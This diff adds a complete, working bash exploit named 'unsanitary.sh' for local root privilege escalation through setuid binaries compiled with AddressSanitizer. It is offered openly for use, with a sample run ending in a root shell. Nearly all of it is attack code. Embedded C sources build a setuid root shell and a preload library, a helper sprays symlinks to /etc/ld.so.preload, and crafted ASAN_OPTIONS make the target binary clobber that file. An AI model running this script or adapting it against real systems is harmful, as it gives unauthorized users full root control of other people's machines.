@@ -1,0 +1,192 @@
+#!/bin/bash
+# unsanitary.sh - ASAN/SUID Local Root Exploit
+# Exploits er, unsanitized env var passing in ASAN
+# which leads to file clobbering as root when executing
+# setuid root binaries compiled with ASAN.
+# Uses an overwrite of /etc/ld.so.preload to get root on
+# a vulnerable system. Supply your own target binary to
+# use for exploitation.
+# Implements the bug found here: http://seclists.org/oss-sec/2016/q1/363
+# Video of Exploitation: https://www.youtube.com/watch?v=jhSIm3auQMk
+# Released under the Snitches Get Stitches Public Licence.
+# Gr33tz to everyone in #lizardhq and elsewhere <3
+# ~infodox (18/02/2016)
+# FREE LAURI LOVE!
+# ---
+# Original exploit: https://gist.github.com/0x27/9ff2c8fb445b6ab9c94e
+# Updated by <bcoles@gmail.com>
+# - fixed some issues with reliability
+# - replaced symlink spraying python code with C implementation
+# https://github.com/bcoles/local-exploits/tree/master/asan-suid-root
+# ---
+# user@linux-mint-19-2:~/Desktop$ file /usr/bin/a.out 
+# /usr/bin/a.out: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f9f85a5b58074eacd5b01eae970320ed22984932, stripped
+#
+# user@linux-mint-19-2:~/Desktop$ ldd /usr/bin/a.out | grep libasan
+# 	libasan.so.4 => /usr/lib/x86_64-linux-gnu/libasan.so.4 (0x00007f028d427000)
+#
+# user@linux-mint-19-2:~/Desktop$ objdump -x /usr/bin/a.out | grep libasan
+#   NEEDED               libasan.so.4
+#
+# user@linux-mint-19-2:~/Desktop$ ASAN_OPTIONS=help=1 /usr/bin/a.out 2>&1 | grep 'flags for AddressSanitizer'
+# Available flags for AddressSanitizer:
+#
+# user@linux-mint-19-2:~/Desktop$ ./unsanitary.sh /usr/bin/a.out
+# Unsanitary - ASAN/SUID Local Root Exploit ~infodox (2016)
+# [+] /usr/bin/a.out was compiled with libasan
+# [.] Compiling /tmp/.libhax.c ...
+# [.] Compiling /tmp/.rootshell.c ...
+# [.] Compiling /tmp/.spray.c ...
+# [.] Spraying /home/user/Desktop with symlinks ...
+# [.] Adding /tmp/.libhax.so to /etc/ld.so.preload ...
+# ./unsanitary.sh: line 135: 30663 Aborted                 (core dumped) ASAN_OPTIONS='disable_coredump=1 abort_on_error=1 verbosity=0' "${target}" > /dev/null 2>&1
+# [.] Cleaning up...
+# [+] Success:
+# -rwsr-xr-x 1 root root 8384 Jan 12 14:21 /tmp/.rootshell
+# [.] Launching root shell: /tmp/.rootshell
+# root@linux-mint-19-2:~/Desktop# id
+# uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),128(sambashare),1000(user)
+# root@linux-mint-19-2:~/Desktop#
+# ---
+
+rootshell="/tmp/.rootshell"
+lib="/tmp/.libhax"
+spray="/tmp/.spray"
+
+target="${1}"
+log_prefix="$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 12 | head -n 1)___"
+spray_size=100
+
+command_exists() {
+  command -v "${1}" >/dev/null 2>/dev/null
+}
+
+echo "Unsanitary - ASAN/SUID Local Root Exploit ~infodox (2016)"
+
+if [[ $# -eq 0 ]] ; then
+    echo "use: $0 /full/path/to/targetbin"
+    echo "where targetbin is setuid root and compiled w/ ASAN"
+    exit 0
+fi
+
+if ! command_exists gcc; then
+  echo '[-] gcc is not installed'
+  exit 1
+fi
+
+if ! test -w .; then
+  echo '[-] working directory is not writable'
+  exit 1
+fi
+
+if ! test -u "${target}"; then
+  echo "[-] ${target} is not setuid"
+  exit 1
+fi
+
+if [[ $(/usr/bin/ldd "${target}") =~ "libasan.so" ]]; then
+  echo "[+] ${target} was compiled with libasan"
+else
+  echo "[!] Warning: ${target} appears to have been compiled without libasan"
+fi
+
+echo "[.] Compiling ${lib}.c ..."
+
+cat << EOF > "${lib}.c"
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+void init(void) __attribute__((constructor));
+
+void __attribute__((constructor)) init() {
+  if (setuid(0) || setgid(0))
+    _exit(1);
+
+  unlink("/etc/ld.so.preload");
+
+  chown("${rootshell}", 0, 0);
+  chmod("${rootshell}", 04755);
+  _exit(0);
+}
+EOF
+
+if ! gcc "${lib}.c" -fPIC -shared -ldl -o "${lib}.so"; then
+  echo "[-] Compiling ${lib}.c failed"
+  exit 1
+fi
+/bin/rm -f "${lib}.c"
+
+echo "[.] Compiling ${rootshell}.c ..."
+
+cat << EOF > "${rootshell}.c"
+#include <stdio.h>
+#include <sys/stat.h>
+#include <unistd.h>
+int main(void)
+{
+  setuid(0);
+  setgid(0);
+  execl("/bin/bash", "bash", NULL);
+}
+EOF
+
+if ! gcc "${rootshell}.c" -o "${rootshell}"; then
+  echo "[-] Compiling ${rootshell}.c failed"
+  exit 1
+fi
+/bin/rm -f "${rootshell}.c"
+
+echo "[.] Compiling ${spray}.c ..."
+
+cat << EOF > "${spray}.c"
+#include <stdio.h>
+#include <sys/stat.h>
+#include <unistd.h>
+int main(void)
+{
+  pid_t pid = getpid();
+  char buf[64];
+  for (int i=0; i<=${spray_size}; i++) {
+    snprintf(buf, sizeof(buf), "${log_prefix}.%ld", (long)pid+i);
+    symlink("/etc/ld.so.preload", buf);
+  }
+}
+EOF
+
+if ! gcc "${spray}.c" -o "${spray}"; then
+  echo "[-] Compiling ${spray}.c failed"
+  exit 1
+fi
+/bin/rm -f "${spray}.c"
+
+echo "[.] Spraying $(pwd) with symlinks ..."
+
+/bin/rm $log_prefix* >/dev/null 2>&1
+$spray
+
+echo "[.] Adding ${lib}.so to /etc/ld.so.preload ..."
+
+ASAN_OPTIONS="disable_coredump=1 suppressions='/${log_prefix}
+${lib}.so
+' log_path=./${log_prefix} verbosity=0" "${target}" >/dev/null 2>&1
+
+ASAN_OPTIONS='disable_coredump=1 abort_on_error=1 verbosity=0' "${target}" >/dev/null 2>&1
+
+echo '[.] Cleaning up...'
+/bin/rm $log_prefix*
+/bin/rm -f "${spray}"
+/bin/rm -f "${lib}.so"
+
+if ! test -u "${rootshell}"; then
+  echo '[-] Failed'
+  /bin/rm "${rootshell}"
+  exit 1
+fi
+
+echo '[+] Success:'
+/bin/ls -la "${rootshell}"
+
+echo "[.] Launching root shell: ${rootshell}"
+$rootshell
